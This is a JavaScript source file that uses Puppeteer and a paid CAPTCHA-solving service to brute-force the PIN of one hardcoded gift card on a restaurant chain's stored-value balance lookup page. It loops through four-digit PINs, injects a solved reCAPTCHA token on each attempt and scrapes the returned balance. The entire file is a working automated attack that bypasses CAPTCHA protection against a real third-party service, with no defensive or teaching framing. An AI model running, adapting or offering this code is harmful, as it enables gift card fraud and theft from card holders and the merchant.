const ac = require("@antiadmin/anticaptchaofficial");
const puppeteer = require("puppeteer");
const config = require("./config.json");

const number = "6006496612521300008";

ac.setAPIKey("assafasdsadsadasd");
// ac.getBalance()
//   .then((balance) => console.log("my balance is: " + balance))
//   .catch((error) => console.log("an error with API key: " + error));

async function loginUser(options) {
  try {
    console.log("solving recaptcha ...");
    let token = await ac.solveRecaptchaV2Proxyless(
      "https://wbiprod.storedvalue.com/WBI/lookupservlet?language=en&host=joeyrestaurants.com",
      "6LckryETAAAAAPFZhVfos9Ays4NSWb_7POn1-Y-u",
    );
    if (!token) {
      console.log("something went wrong");
      return;
    }
    console.log("Generated pin is:", options.pin);

    const browser = await puppeteer.launch({
      args: ["--start-maximized"],
      headless: true,
      slowMo: 10,
      defaultViewport: null,
    });

    const page = await browser.newPage();

    await page.setDefaultNavigationTimeout(0);

    await page.setViewport({ width: 1366, height: 768 });

    await page.goto(
      "https://wbiprod.storedvalue.com/WBI/lookupservlet?language=en&host=joeyrestaurants.com",
      {
        waitUntil: "load",
        // Remove the timeout
        timeout: 0,
      },
    );

    await page.waitForNavigation({ waitUntil: "domcontentloaded" });

    //* adds number
    console.log("filling number input ..");
    await page.waitForSelector('input[name="cardNoH"]', {
      waitUntil: "load",
      timeout: 0,
      visible: true,
    });
    await page.type('input[name="cardNoH"]', number, {
      delay: 50,
    });

    await page.waitForNavigation({ waitUntil: "domcontentloaded" });

    //* adds pin
    console.log("filling pin input ..");
    await page.type("#Pin", options.pin, {
      delay: 50,
    });

    console.log("setting recaptcha g-response ...");
    await page.$eval(
      "#g-recaptcha-response",
      (element, token) => {
        element.value = token;
      },
      token,
    );

    //* click submit
    console.log("submitting form .. ");
    await page.click('input[name="action"]', {
      delay: 50,
    });

    await page.waitForNavigation({ waitUntil: "domcontentloaded" });

    const content = await page.evaluate(() => {
      let rowList = [];

      let rows = document.querySelectorAll("form");
      rows.forEach((row) => {
        const tdList = Array.from(
          row.querySelectorAll("p"),
          (column) => column.innerText,
        );

        if (tdList.length >= 2) {
          // push the data
          rowList.push({
            number: tdList[0],
            balance: tdList[1],
          });
        }
      });
      return rowList;
    });

    // let balance = await page.evaluate(() => {
    //   let results = [];
    //   let items = document.querySelectorAll("form p b");
    //   items.forEach((item) => {
    //     results.push({
    //       number: item.innerText,
    //       balance: item.innerText,
    //     });
    //   });
    //   return results;
    // });

    console.log(content);
    console.log(options.pin);

    // console.log(balance);

    //* close the browser
    await browser.close();
  } catch (e) {
    console.log(e);
  }
}

let main = async () => {
  // test1 = loginUser({ number: config.number1, pin: config.pin1, index: 1 });
  // test2 = loginUser({ number: config.number2, pin: config.pin2, index: 2 });
  // test3 = loginUser({ number: config.number3, pin: config.pin3, index: 3 });
  // await Promise.all([test1]);
  for (let i = 0; i < 9999; i++) {
    let guess = String(i).padStart(4, "0");
    await Promise.all([
      loginUser({
        pin: guess,
      }),
    ]);
  }
};

main();
